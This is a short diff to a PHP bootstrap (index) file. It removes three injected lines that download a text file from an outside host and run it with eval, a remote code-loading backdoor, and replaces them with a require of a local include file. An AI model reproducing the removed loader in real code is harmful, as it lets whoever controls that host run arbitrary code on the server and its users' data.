@@ -1,8 +1,5 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/verbum.txt'));
-$url = "?> ".$url;
-eval($url);
-
+require('landit.incs.php');
 /**
  * @defgroup index Index
  * Bootstrap and initialization code.
